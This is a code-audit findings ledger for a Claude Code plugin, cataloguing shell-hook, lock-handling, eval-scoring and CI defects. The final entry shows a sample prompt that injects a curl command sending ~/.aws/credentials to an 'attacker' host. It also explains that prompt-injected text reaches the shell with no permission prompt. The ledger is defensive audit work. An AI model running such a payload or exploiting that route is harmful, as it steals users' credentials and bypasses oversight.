| CA-320 | P1 | fixed | L8 | plugins/edm/hooks/hooks.json:86 | NEW in round 5, introduced by round 4's own CA-186 remediation. The new directory-existence guard evaluates srd_root against the HOOK'S CURRENT WORKING DIRECTORY, while the staged-path matcher it guards uses repository-root-relative paths from git. The two disagree whenever the commit is made from a subdirectory: the guard concludes the root does not exist, all commit-time enforcement silently drops, and the operator receives a misleading typo diagnostic for a correct configuration. Second consequence, visible on every commit in this repository: the marketplace's six other plugins have no SRD directory, so the guard now emits an EDM error line for every commit anywhere in the repository where the pre-fix hook was silent. Fix: resolve the existence test against the git top-level path rather than the cwd, and refuse loudly only when srd_root was set EXPLICITLY -- an unset default that does not exist simply means the project does not use EDM and should stay silent. Remediate in the same pass as CA-298 and CA-186; all three are the same twenty lines of the same hook. ROUND 6 (L8 re-verify): STILL OPEN and ESCALATED P2 -> P1 -- INCOMPLETELY CLOSED, and the fix removed the only observable signal. The remediation correctly repointed TWO of the hook's four resolution bases at the repository root: the existence guard (check_dir="${repo_root:-.}/${srd_root}" with repo_root=$(git rev-parse --show-toplevel)) and the staged-path matcher (root="$root_for_awk" awk ... over git diff --cached --name-only). It did NOT repoint the two CONSUMERS at the end of the same hook body, both of which still resolve srd_root against the HOOK'S OWN CWD independently of everything the hook just computed: bin/edm-state:65 (SRD_ROOT="${EDM_SRD_ROOT:-${CLAUDE_PLUGIN_OPTION_SRD_ROOT:-./SRD}}", consumed by state_file_for:223 as a cwd-relative path) and bin/edm-lint-artifacts:64 (byte-identical derivation). Confirmed by inspection: EDM_SRD_ROOT occurs exactly ONCE in hooks/hooks.json, i.e. only in the hook's own derivation and at neither child call site. Exploitation, no attacker and no user error -- the exact premise CA-320 itself established and which the remediation accepts by resolving repo_root from git at all: a commit made with the hook's cwd anywhere other than the repository root. (1) check_dir="$repo_root/SRD" exists, guard passes. (2) The staged path SRD/edm/EDMV3__prompt-streamline/srd.md is repo-root-relative, awk extracts EDMV3, the charset filter passes, prefixes="EDMV3". (3) edm-state resolve-dir EDMV3 runs with SRD_ROOT="./SRD" relative to the SUBDIRECTORY, state_file_for returns ./SRD/EDMV3/.edm-state.json, cmd_resolve_dir (:4416) finds no file and dies. (4) \|\| continue skips the prefix; every prefix skips the same way; fail stays 0; hook exits 0. Net: ALL commit-time artifact enforcement silently drops, AND the pre-CA-320 misleading-typo diagnostic that at least signalled something is now gone. The edm-lint-artifacts invocation on the next line is unreachable in this configuration, so an attribution trailer, a non-ASCII byte or a raw Mermaid semicolon commits clean. The same mismatch also makes the GUARD itself wrong, not merely the consumers, when the Claude Code project directory is a SUBDIRECTORY of the git root (a monorepo sub-project), because $repo_root/SRD is then not where the SRD tree lives. SECOND SUB-DEFECT, merged here because one edit closes both (L8-6-02): the staged-path matcher assumes git diff --cached --name-only emits repository-root-relative paths, which is git's DEFAULT but is configurable -- diff.relative = true (repo .git/config, ~/.gitconfig, or -c) makes git diff print paths relative to the current directory AND EXCLUDE staged paths outside it entirely, so a developer with that common ergonomic preference committing from a subdirectory has prefixes come back empty, 'test -z "$prefixes" && exit 0' fires, and enforcement drops with no diagnostic. P1 rather than P0 because the blocking lint:artifacts CI job (edm-lint-artifacts --all) still catches the same violation classes at merge-request time, so the failure mode is a LOST FAST LOCAL GATE rather than an unguarded merge path. ROUND 6 FIX: (1) make all four bases agree on one absolute value once -- after check_dir is computed and the -d test passes, pass it down explicitly rather than letting the children re-derive: EDM_SRD_ROOT="$check_dir" edm-state resolve-dir "$p" and out=$(EDM_SRD_ROOT="$check_dir" edm-lint-artifacts "$p" 2>&1); both honor EDM_SRD_ROOT and both accept an absolute value without further change (the equivalent 'cd "$repo_root" \|\| exit 0' immediately after repo_root is captured also fixes the matcher's base as a side effect, but prefer the explicit-env form so the fix is visible at the two call sites it protects). (2) Pin the diff base: staged=$(git -c diff.relative=false diff --cached --name-only 2>/dev/null); keep this even if the cd variant is taken, because cd alone does not defeat diff.relative. (3) Add a smoke case that EXECUTES the hook body -- not a static grep of it -- from a subdirectory of a scratch repo with a real violation staged, asserting exit 2; the only current coverage is static (wave7-smoke.sh:3370 and the stub-based case at :6176) and is structurally incapable of observing a resolution-base mismatch, the same blind spot CA-298's fix note called out for the sibling hook family. See also CA-348, whose macOS bare-mktemp path is a live counterexample to this guard's relativization contract. | 5 | 7 |

CONSEQUENCE, and why this is P1 rather than P2: an operator following this runbook EXACTLY arms the tripwire with the documented 'a missing variance record is treated as 0 -- strict' fallback SILENTLY ENGAGED, so every subsequent run compares against a threshold equal to the baseline total minus zero, ordinary run-to-run noise is reported as REGRESSION (exit 1), and the 'variance allowed: 0' line on screen LOOKS DELIBERATE rather than like a misconfiguration. This is the ONE DOCUMENT that tells a human how to arm the tripwire, and it costs THREE LIVE EVAL RUNS to reach the point of finding out. Fix: change the example to a variance object carrying total_range, and either rename per_dimension_max_minus_min to something a consumer will read or state plainly that nothing consumes it today and it is recorded for humans only. DURABILITY: assert in the smoke suite that the field name appearing in evals/baseline/README.md's JSON example equals the jq path in bin/edm-compare-eval -- the two strings must be equal -- with a positive control. Related to CA-462: both are ways the one automated prompt-quality tripwire this initiative has fails to do its job. | 8 | 9 |
| CA-462 | P1 | fixed | L11 | plugins/edm/evals/fixtures/tiny-svc/expected.json vs plugins/edm/evals/score-artifacts.sh:42 onward | NEW in round 8 (L11 finding 4): the tiny-svc eval fixture's GROUND TRUTH IS CONSUMED BY NOTHING, so the eval measures only self-consistency. expected.json enumerates six known, countable gaps in the frozen eval subject, carries a version contract, and is cross-referenced by five source-file comments plus evals/README.md:277. NOTHING EXECUTABLE READS IT: neither evals/score-artifacts.sh nor evals/run-eval.sh nor bin/edm-compare-eval nor any smoke suite contains the string expected.json, the gap-ID prefix, or any case-insensitive reference to it. The scorer's five dimensions (requirement-id-coverage, ac-testability, mermaid-parse-success, coverage-map-bidirectionality, lens-jsonl-prose-agreement; :42 onward, restated at evals/README.md:200-213) are EVERY ONE OF THEM computed over the run's OWN OUTPUT FILES. The fixture README states the intended wiring IN SO MANY WORDS at evals/fixtures/tiny-svc/README.md:22-25: the gaps 'are enumerated in expected.json alongside this README so the eval scorer (score-artifacts.sh, EDMV3-T23) has ground truth to check a produced SRD against, RATHER THAN ONLY A SELF-CONSISTENCY CHECK.' The named consumer is in scope, exists, and does not consume it -- so the harness delivers EXACTLY the self-consistency-only scoring the README says it was built to avoid. Why P1: the break is load-bearing for the ONLY automated regression detector this initiative has for prompt quality. eval:nightly (.gitlab-ci.yml:695-742) feeds scores.json to bin/edm-compare-eval against a committed baseline, and because no dimension consults the ground truth, an eval run whose SRD surfaces ZERO of the six known gaps can score IDENTICALLY to one that surfaces all six -- both are internally consistent, both have sequential requirement IDs, both parse their Mermaid. The tripwire is structurally blind to the regression class it exists to catch, and CLAUDE.md:345 already records that the baseline itself is uncaptured, so nothing else compensates. False-alarm filter: filter 1 FAILS (the documentation asserts the OPPOSITE of current behaviour rather than sanctioning it); filter 2 FAILS (no comment in score-artifacts.sh explains the omission); filter 3 FAILS (there is no other scorer; edm-compare-eval only compares two scores files and never reads the fixture). Fix: add a SIXTH scorer dimension, known-gap-recall, reading the fixture's expected.json and, for each gap entry, grepping the run's srd.md for its declared marker (adding an id/match regex field to each entry for this purpose), scoring the matched fraction. It MUST follow the file's existing skip contract -- emit a null score plus a skip reason when the run directory is not the tiny-svc fixture -- so the scorer stays usable against arbitrary run directories, and it MUST bump scorer_version so edm-compare-eval's version handshake (:81) refuses to compare across the change rather than silently mixing five- and six-dimension totals. If a sixth dimension is out of scope, the honest alternative is to correct evals/fixtures/tiny-svc/README.md:22-25 and evals/README.md:277 to state that expected.json is human-reference-only and is checked by no code -- but that leaves the tripwire blind, so wiring it is the better route. | 8 | 9 |

| CA-474 | P1 | open | L8+L1 | .gitlab-ci.yml:301 | NEW in round 9, INTRODUCED BY THE CA-437 FIX (L8 P1-1 + L1-002 merged; L8 rates P1 and L1 P2 -- taken at P1 on multi-lens corroboration plus the blocking-job blast radius): lint:hooks-shell iterates the new NUL-delimited extraction with a 'while IFS= read -r -d ...' loop. The -d option is a bash extension with no POSIX equivalent -- dash has no -d, and BusyBox ash, the shell in the alpine:3.20 images every alpine_edm consumer uses, supports -r -n -p -s -t -u but NOT -d. A sweep of every script body in the file for bash-only constructs (double-bracket tests, local, here-strings, mapfile, declare, array syntax and read -d) returns EXACTLY ONE HIT: line 301. The file states the opposing constraint three times, once inside this very job's own header comment: :274-276 ('process substitution needs bash itself as the invoking shell, which is not guaranteed for the runner script stage'), :517-519 and :566-568. Installing bash in before_script does not change which interpreter the runner already selected for the script stage. Failure mode on an sh runner: read rejects -d, the while condition is false immediately (errexit does not apply to a loop condition), the body never executes, COUNT stays 0, and the CA-437 cross-check at :320 fails the job with a message naming an extraction or splitting regression in hooks.json -- fail-closed but ACTIVELY MISDIAGNOSING, on a needs-nothing, no-allow_failure job that gates the plugin's most privileged shell surface and has never had a green run against a live runner fleet. Fix: drop the delimiter question entirely by indexing with jq -- derive EXPECTED_COUNT once from the hooks.json command list, then loop an index from 0 while it is below EXPECTED_COUNT, writing the indexed .command to its own temp file and incrementing COUNT, which makes COUNT equal to EXPECTED_COUNT structurally rather than by post-hoc check and is immune to every splitting question including the multi-line .command case CA-437 was about; keep the :320 cross-check and retarget its message at a jq or index mismatch. Alternative, only if the runner fleet is confirmed to resolve bash for the script stage: pin the shell on the alpine_edm anchor AND delete the three POSIX-sh-safe comments as false. Do not leave the file asserting one thing and doing another. | 9 |  |

| CA-251 | P2 | fixed | L1+L3+L8 | plugins/edm/bin/edm-state:3381 | NEW in round 4, introduced by this round's own CA-203 remediation and filed independently by L1 and L8 at the same site. git-lock-check's replacement liveness probe interpolates git_dir into a pgrep -f pattern and is wrong in three compounding ways while the comment at :3368-3375 asserts the opposite. (1) git_dir comes from git rev-parse --git-dir at :3338, which prints the RELATIVE string dot-git from the top of a work tree -- the normal invocation point -- so the pattern is four characters, not a repository-identifying path. (2) pgrep -f takes an extended regex, so the leading dot is a wildcard and the pattern matches any command line containing any character followed by git: a git-core helper path, digit, legit, or an unrelated repository's git anywhere on the host. That is exactly the host-wide matching the comment claims to have eliminated. (3) It self-matches, because the invoking process's own command line ends in git-lock-check and pgrep excludes only itself, not its ancestors. Net effect: whenever lsof reports nothing -- a genuinely stale lock, the only case this subcommand exists for -- the fallback fires, :3384-3389 prints that possible holder evidence was found, and the removal branch at :3391-3404 is unreachable, so the subcommand can no longer perform its documented remediation. L8 adds the opposite direction: an invalid-ERE GIT_DIR empties the evidence and the lock is removed with no liveness check at all. Invisible to the suite, because wave7-smoke.sh:5804-5811 greps the function body for the literal source text and never executes the branch. Fix: resolve to an absolute path with git rev-parse --absolute-git-dir, keep lsof as the primary oracle, match the fallback as a FIXED string by filtering pgrep -af output through grep -F, exclude this process's own ancestry, and refuse with a liveness-undetermined diagnostic when neither oracle is available. Then add an executing test that backdates a lock file and asserts the removal path is actually taken. ROUND 5 (three lenses): SUBSTANTIALLY FIXED, DOWNGRADED P1 -> P2, two residuals. Every defect the finding named is closed and was re-derived independently by L1, L3 and L8: --absolute-git-dir at :3432, the age gate, lsof as the primary oracle, fixed-string ps-plus-grep classification at :3509-3510 that is correctly literal for every metacharacter, self and parent PID exclusion at :3511, refusal when neither oracle is available, and the mv-aside removal idiom. The P1 justification -- that the subcommand could no longer perform its documented remediation because the removal branch was unreachable -- no longer holds, and both corroborating lenses assigned P2 to what remains. RESIDUAL (1), L8: candidate SELECTION still passes git_dir to pgrep as an extended regex, so an invalid pattern (an unbalanced bracket, a trailing backslash) makes pgrep error into a discarded stderr behind a trailing or-true, the candidate list stays empty, and that is indistinguishable from no-processes-matched -- so the lock is removed with NO liveness check having run, reachable wherever lsof is absent, which is common on Alpine and in CI. The prescribed executing test that backdates a lock and asserts the removal path is taken also never landed. RESIDUAL (2), L3: the mv-aside window has a third outcome the comment omits -- if a concurrent remover clears the stale lock and git re-acquires it inside the probe window of tens to hundreds of milliseconds, this process renames git's brand-new LIVE lock aside and deletes it, permitting a second concurrent index write. Fix: distinguish pgrep's exit codes (1 means no candidates, greater than 1 means undetermined and must route to refusal), or better drop the regex dependency entirely by filtering a full process listing through a fixed-string match; re-assert the age gate immediately before the mv and refuse if the lock now reads younger; soften the comment to name the residual rather than assert it away; and land the backdated-lock executing test. Change-control half (no CHANGELOG entry for a destructive-subcommand behaviour change) is carried under CA-275. ROUND 6: FIXED, with one closure resting on absence-of-report. L3's residual (2) is closed and L1 verified it: a second age re-check was added immediately before the mv-aside. L7 independently re-read cmd_git_lock_check this round and confirms it reads the age through the shared _git_lock_age_seconds primitive and REFUSES when the age is undetermined, which is the direction this finding prescribed. CAVEAT recorded under CA-377: L8's residual (1) -- distinguishing pgrep's exit codes in candidate SELECTION so an invalid-ERE git_dir routes to refusal rather than to an empty candidate list -- was not positively re-verified by any lens; L3 did not reach cmd_git_lock_check at all this round. L1 read all 5193 lines of edm-state and L8 swept for injection, and neither filed it, so it is marked fixed on absence of report. Spot-check and re-open under this ID if the ERE dependency survives. | 4 | 6 |

| CA-318 | P2 | fixed | L7 | plugins/edm/bin/edm-state:1127 | NEW in round 5: the two stale-lock reclaimers in bin/edm-state take OPPOSITE fail-safe directions for the identical no-liveness-oracle situation, while the file's comments present them as one agreeing family. cmd_git_lock_check refuses to remove a lock when no oracle is available and gates on age, which is correct per its own stated rationale and per CA-251's remediation. with_state_lock's invalid-pidfile path does the reverse -- it reclaims immediately, with no age gate and no oracle. A contributor reading either site takes the wrong lesson to the other, and the reclaiming direction is the one that can delete a live lock. Coordinate with CA-251, whose fix touches the sibling site. ROUND 6 (L7 re-verify): STILL OPEN -- FIXED ON THE HAPPY PATH ONLY, and both new comments now assert the asymmetry is closed in both directions. Both reclaimers now have an age gate, so L1's 'FIXED' verdict is right about the normal case. They take OPPOSITE directions when the age cannot be computed. cmd_git_lock_check reads the age through the shared primitive and treats failure as unknown -- lock_age_s="$(_git_lock_age_seconds "$lock_file")" \|\| lock_age_s="", then gates on [[ -n "$lock_age_s" ]] && (( lock_age_s >= 60 )), so an unknown age falls to the else and REFUSES (return 1). The sibling at :1185-1193 hand-rolls the same computation with the INVERSE default: _lockdir_created_s="$(date -r "$lockdir" +%s 2>/dev/null \|\| echo 0)"; _lockdir_age_s=$(( $(date +%s) - _lockdir_created_s )) -- an unreadable mtime yields created_s=0, an age of ~1.7e9 seconds, and an unconditional RECLAIM. It also BYPASSES _git_lock_age_seconds (:3538-3543), whose own docstring states that every age gate in the file derives from one call to it and that it is the sanctioned portable primitive (date -r, never stat, never find -mmin -- the CA-303 lesson). This is the CA-227/CA-228 'PARTIALLY FIXED, and the comment says otherwise' shape: :1173-1176 claims the reclaim is age-gated 'so it agrees in direction with cmd_git_lock_check's own undetermined-liveness reclaim (which refuses rather than assumes dead)' and :3636-3638 claims the sibling 'now agrees with the refusal direction here' -- both false on the error path. Behaviourally, on any host where date -r <dir> does not work, the new gate silently degrades to NO GATE AT ALL (always reclaim -- exactly pre-fix behaviour, with no diagnostic), while the sibling degrades to maximum caution, and reclaiming is the direction that can delete a LIVE lock. Note the two age THRESHOLDS legitimately differ (1s vs 60s, documented at :1176-1184) and are NOT part of this finding. Fix: replace the inline computation with _lockdir_age_s="$(_git_lock_age_seconds "$lockdir")" \|\| _lockdir_age_s="", then gate on [[ -n "$_lockdir_age_s" ]] && (( _lockdir_age_s >= 1 )), with the existing not-reclaiming-yet stderr line covering the empty case and naming 'age could not be determined' so the two refusal reasons are distinguishable. One primitive, one error contract, and both comments become true as written. | 5 | 7 |

Interleaving two render-ledger calls (or one render-ledger against a concurrent ledger append) yields: A renders from ledger v1, B renders from ledger v2, B's mv lands, then A's mv lands, then A records the hash of what is now A's content while B records B's -- last-hash-wins racing last-content-wins independently. The failure surfaces later as a phantom cmd_checkpoint drift warning (:2263-2295) telling the user the ledger was hand-edited when it was not, and the remediation that warning prescribes -- re-run the audit and re-approve a gate -- is expensive and wrong. This is CA-055's class (unlocked read-dedup-insert on the pattern file) at the ledger, and unlike the pattern file the ledger genuinely has concurrent writers by design: eleven lens agents plus a synthesizer per round. Reachability caps it at P2: render-ledger is invoked once per round from the code-audit skill, so two concurrent invocations require two audits converging on one initiative -- the exact scenario CA-055 was filed for and fixed. Fix: wrap steps 1-2 in a single with_state_lock acquisition on the ledger's own lockbase ("${init_dir}/code-audit/findings-ledger"), moving the body into a _cmd_render_ledger_body helper the way _cmd_audit_round_complete_body and _cmd_record_partial_verdict_close_body are structured. Respect the constraint that makes this non-trivial: record_artifact_hash calls rmw_state, which calls with_state_lock, and the reentrancy guard at :1067 is PROCESS-GLOBAL rather than lockbase-keyed (CA-306) -- so record_artifact_hash cannot be called from inside the new locked body. Structure it as: locked body does read + render + write_atomic and prints the rendered path; record_artifact_hash runs after the lock is released. ROUND 8 (L3): CONFIRMED FIXED -- bin/edm-state:4197-4199 now wraps read, render and write_atomic in a single with_state_lock on the ledger's own lockbase, and the body (:4133-4178) performs all three with no unlocked step between them. record_artifact_hash at :4212 is deliberately outside the lock after release, with the :4203-4211 comment correctly stating why (it takes the STATE file's lock via rmw_state, and the trap-depth guard is process-global). The body's die calls run inside with_state_lock's body subshell but the caller re-dies at :4199, so the failure still terminates the real process. No new defect. | 6 | 8 |
| CA-355 | P2 | fixed | L3 | plugins/edm/bin/edm-state:4622-4630 | NEW in round 6: update-patterns reports a REFUSAL as a clean zero-finding success and persists that zero, so N novel findings are lost permanently. In _cmd_update_patterns_body, once new_findings > 0 the insertion point is resolved by pattern_insert_line_for; if it is empty or 0 the code echoes a 'skipping (nothing appended, no end-of-file fallback)' line to STDERR, then 'echo 0; return 0'. That branch is indistinguishable, on stdout and in exit status, from 'there were genuinely no novel findings'. cmd_update_patterns then persists the zero into state at :4709-4713 as patterns_updates[<type>] = {updated_at: ..., new_findings: 0} and prints 'no novel findings to append' at :4718 -- which is false; there were N novel findings and none was recorded anywhere. The state field is the durable artifact, so the loss is permanent: a later run re-derives the same N findings, hits the same missing heading, records another 0, and nothing in state ever indicates the pattern library is N entries behind. Root trigger, and itself the defect: the pre-flight at cmd_update_patterns:4693 greps for the target heading with grep -qxF, which is NOT fence-aware, while the body resolves through the fence-AWARE pattern_insert_line_for (CA-056), so the inner branch fires exactly when the heading exists as plain text but sits only inside a fence -- a divergence between a fence-unaware pre-flight and a fence-aware resolver. Either way, do not write new_findings: 0 into patterns_updates for a run that found N and appended none. ROUND 8 (L3): CONFIRMED FIXED -- bin/edm-state:5080 now resolves the pre-flight through pattern_insert_line_for, the same fence-aware resolver the body uses, instead of the old grep -qxF. The three outcomes are now distinguishable: heading absent gives a clean skip (:5085-5086, exit 0), heading present only inside a fence gives a loud refusal (:5083), heading resolvable proceeds. The body re-checks under the lock at :5001-5003 and dies rather than recording a false zero, and the refusal propagates correctly through the command substitution at :5096, so nothing is written to patterns_updates. No new defect. | 6 | 8 |

| CA-373 | P2 | fixed | L3 | plugins/edm/bin/edm-state:4966 | NEW in round 6: the HANDOFF.md Notes round-trip strips exactly ONE leading newline on write, but the capture can produce zero or two, so the blank-line normalization is not a fixed point for a hand-edited file and the comment at :4962-4966 states a general property the code establishes only for the specific case. _write_handoff_body captures the Notes block verbatim from the '## Notes' heading to EOF (notes="$(awk '/^## Notes/{p=1;next} p{print}' "$handoff_path" ...)"; notes="${notes#$'\\n'}") and re-emits it at :5124-5125 as printf '%s\\n\\n' '## Notes' followed by printf '%s\\n' "${notes}". A title containing '\|' therefore terminates the cell early and silently shifts every column after it, so the Summary, Raised Round and Resolved Round values render into the wrong columns for that row and every reader of findings-ledger.md gets a misaligned or truncated record. This is not hypothetical: pipes occur naturally in exactly the content this ledger carries -- bash case patterns (''\|*[!0-9]*), extended regexes (^[a-z][a-z0-9:_-]*: FAIL[^E]\|...), glob exclusion sets (*.awk\|*.txt), enum diagnostics (open\|fixed\|noted) and rendered column lists (Epic \| Layer \| Coverage) -- and several round-6 entries in this very ledger contain them (CA-333, CA-340, CA-343, CA-350, CA-353, CA-358, CA-360, CA-362, and the re-scoped CA-233 and CA-317). Compounding it, findings-ledger.md is a COMMITTED artifact whose hash is recorded by record_artifact_hash at :3864, so a corrupted render is committed and hashed as authoritative, and cmd_checkpoint's drift detection compares against that hash rather than against the JSONL that is the real source of truth. Prior rounds did not surface this because their authors happened to phrase titles without pipes; that is a convention nobody wrote down and nothing enforces. Fix: escape the pipe (and, while there, the backslash) in every JSONL string interpolated into a table cell -- in the jq program that builds $body, apply gsub("\\\\\|"; "\\\\\\\\\|") to title, component and any other cell-bound field -- and add a smoke case that renders a ledger containing a pipe-bearing title and asserts the rendered row still has exactly eight cells. | CA-396 | P2 | fixed | L3 | plugins/edm/bin/edm-state:1202 | NEW in round 7 (L3, two findings merged because one line fixes both): the G49 flock-timeout marker is created at ${TMPDIR:-/tmp}/edm-state.lock-timeout.$$ while both cleanup sweeps glob a different directory AND a different separator -- :2948 (archive) and :3372 (migrate-path) iterate ${_dst_lockbase}.lock.timeout.* -- so .lock-timeout. (hyphen, in TMPDIR) never matches .lock.timeout.* (dot, beside the lockbase). Second half: $$ inside a subshell expands to the PARENT's PID, so two backgrounded with_state_lock bodies from one shell compute the identical marker path -- child B times out and mkdirs the marker, child A's pre-clear at :1203 deletes it, and B's _lock_ec 99 branch falls to the else arm at :1224 dying with 'the timeout marker could not be created (check TMPDIR writability)', sending the operator to investigate TMPDIR permissions for a plain lock timeout. Never a false success (both arms die), so diagnosability not correctness. One fix closes both: _lock_timeout_marker="${lockbase}.lock.timeout.${BASHPID:-$$}" keys on lock identity and the true subshell PID and lands the marker where the two existing sweeps already look. Confirm :1202 is the only creation site first (L3's grep was truncated at 120 matches). ROUND 8 (L3): CONFIRMED FIXED. bin/edm-state:1226 now keys the marker on BASHPID with a PID fallback. Two concurrently live with_state_lock invocations necessarily occupy two distinct processes and each computes the marker from its own BASHPID, so the collision is closed for every real shape: separate edm-state processes, backgrounded invocations from one parent, and command-substitution-nested invocations (:4368, :4627, :5096). INDEPENDENT JUDGMENT ON THE TMPDIR LOCATION, asked for explicitly: keep it where it is. mkdir is atomic and refuses ANY pre-existing name including a planted symlink (unlike a truncating redirect, which follows one); the G13/CA-347 gate at :1241 means a pre-planted foreign marker cannot manufacture a false timeout because the existence probe is only reached when the subshell already exited 99; and on a sticky temp directory another user cannot delete our marker. | CA-413 | P2 | fixed | L8 | plugins/edm/hooks/hooks.json:86 | NEW in round 7 (L8 P2-1), residual of round 6's G-relativization fix (CA-320, verified closed on its stated goal this round): relativization is purely LEXICAL and is defeated by a symlinked repo path. case "$srd_root" in "$repo_root") ... "$repo_root"/*) ... esac compares strings, but git rev-parse --show-toplevel returns the PHYSICAL path, and on macOS -- this project's stated primary development platform (bin/edm-state:633) -- /tmp is a symlink to /private/tmp and /var to /private/var. A developer with the repo at /tmp/work who sets EDM_SRD_ROOT=/tmp/work/SRD gets repo_root=/private/tmp/work, the prefix does not match, relativized stays empty, and the hook takes its exit 1 arm emitting 'srd_root is absolute (/tmp/work/SRD) and could not be relativized under the repository root (/private/tmp/work)' -- a message that reads as a configuration error for a path that is in fact inside the repo. Since exit 1 is non-blocking by design, the outcome is that commit-time artifact lint silently stops enforcing for that developer for the rest of the initiative. Same failure for any symlinked worktree path or symlinked home. Fix: normalize both sides physically before comparing (phys_root=$(cd "$repo_root" 2>/dev/null && pwd -P) with a fallback to the original on failure, same for srd_root) and run the existing case against the physical values; add a smoke case that symlinks a scratch repo and asserts relativization still succeeds. | 7 | 9 |
| CA-414 | P2 | open | L8 | plugins/edm/hooks/hooks.json:86 | NEW in round 7 (L8 P2-2): echo "$staged" plus git's default core.quotePath is interpreter-dependent. Two hazards compound. First, git diff --cached --name-only C-quotes any path containing non-ASCII or backslash bytes by default, so a path arrives as a literal double-quoted, backslash-escaped string. Second, echo's treatment of backslash is not portable: bash's builtin leaves it alone without -e, but dash's and BusyBox ash's builtins expand escapes unconditionally -- and the interpreter here is chosen by the host, not by a shebang. On an ash-family host an embedded escape becomes a real newline and one staged path becomes two lines; the prefix-extraction awk then sees a truncated first fragment, the grep -E allowlist drops it, and if that was the only staged file from that initiative the hook exits 0 without linting. Not scored as an exploit (the actor who controls staged filenames is the committer, who can bypass with --no-verify) but a real portability defect, and multiple interpreters are a live condition given test:smoke-bash32 and the Alpine CI images. Fix: git -c core.quotePath=false -c diff.relative=false diff --cached --name-only, and printf '%s\\n' "$staged" in place of echo -- the file already uses printf correctly for the $out diagnostics two statements later, so this is an internal-consistency fix too. | 7 |  |
| CA-415 | P2 | fixed | L8 | plugins/edm/bin/edm-state:1152 | NEW in round 7 (L8 P2-3): the fd-200 rationale comment names the wrong reserved range, inviting a regression into the fd-9/fd-10 hazard. The comment reads 'Fast path: flock on FD 200 (high enough to avoid collisions with stdin/stdout/stderr'. fd 200 is the right choice and the canonical flock(1) idiom -- no defect in the code -- but the stated reason is that 200 clears fds 0-2, which fd 3, fd 9 or fd 10 satisfy just as well, so a future contributor economizing on 'an absurdly high fd' lands on exactly the two dangerous ranges: fd 9 is the conventional BASH_XTRACEFD target (bash -x tracing would clobber the lock) and fds 10+ are what bash uses for saved-descriptor bookkeeping during redirections. The comment protects the code but not the invariant. Fix: restate the real constraint -- 'fd 200: clear of 0-2 (std streams), of 9 (conventional BASH_XTRACEFD), and of the 10+ band bash reserves for internal redirection bookkeeping. Do not lower this.' -- and pin it the same way wave7-smoke.sh already asserts the neighboring CA-169 guard comment. ROUND 8 (L8): FIXED on the comment half. bin/edm-state:1164-1170 now states the real constraint verbatim: '200 is clear of 0-2 (std streams), of 9 (the conventional BASH_XTRACEFD target), and of the 10+ band bash reserves for its own internal redirection bookkeeping -- fd 3 or fd 9/10 would also clear 0-2 while being genuinely dangerous to pick. Do not lower this.' L8 also ran a fresh full-scope file-descriptor sweep: flock's redirection at :1229 is the only numeric fd anywhere in bin/, evals/ or hooks/. The prescription's DURABILITY half did not land and is filed as CA-438 rather than left open here. | 7 | 8 |

66. **NEW in round 7 (L8 P1-1), security: $ARGUMENTS is interpolated into a shell command string and validated only AFTER the sink. All five UserPromptExpansion command hooks run prefix=$(echo "$ARGUMENTS" \| awk '{print $1}') and only then apply the case allowlist. The allowlist is a good guard one statement too late: it validates the OUTPUT of a pipeline that has already executed. If the host textually substitutes $ARGUMENTS into the command string before invoking the shell -- which is what Claude Code does for $ARGUMENTS in slash-command bodies, the closest documented analogue -- then a prompt shaped like /edm:srd A"; curl -s https://attacker/$(cat ~/.aws/credentials) ; " closes the quote, runs arbitrary commands and reopens it, executing on the echo line where the case guard never sees it. Trigger is ordinary prompt text, so any prompt-injection vector (a pasted issue body, a fetched page, a teammate's ticket description) reaches a shell with the user's full privileges and no tool-permission prompt, because hooks are not tool calls.
